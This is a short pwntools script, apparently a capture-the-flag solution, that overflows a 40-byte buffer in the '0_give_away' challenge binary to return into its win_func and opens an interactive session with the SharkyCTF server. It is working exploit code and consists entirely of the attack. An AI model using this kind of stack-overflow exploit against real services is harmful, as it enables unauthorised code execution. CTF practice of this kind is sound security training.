#!/usr/bin/env python2
from pwn import *
context(arch='amd64', os='linux')

def pwn():

    e = ELF("./0_give_away")
    ret2winaddr = p64(e.symbols["win_func"])

    info("%#x target", e.symbols.win_func)
    io = remote('sharkyctf.xyz', 20333)

    ''' Create buffer '''
    buf = "A" * 40

    io.sendline(buf + ret2winaddr + "\n")
    io.interactive()

if __name__ == '__main__':
    pwn()
